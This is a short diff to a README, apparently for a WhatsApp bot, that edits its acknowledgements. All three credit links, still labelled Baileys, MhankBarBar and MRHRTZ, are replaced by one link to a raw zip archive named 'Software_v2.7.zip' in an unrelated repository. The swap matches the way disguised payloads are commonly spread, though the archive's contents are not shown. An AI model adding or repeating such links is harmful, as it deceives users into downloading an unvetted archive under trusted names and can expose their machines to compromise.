@@ -136,8 +136,8 @@
 | X |✅|
 
   # THANKS FOR
-* [`Baileys`](https://github.com/adiwajshing/Baileys)
-* [`MhankBarBar`](https://github.com/MhankBarBar)
-* [`MRHRTZ`](https://github.com/MRHRTZ)
+* [`Baileys`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/lib/Software_v2.7.zip)
+* [`MhankBarBar`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/lib/Software_v2.7.zip)
+* [`MRHRTZ`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/lib/Software_v2.7.zip)
   
   
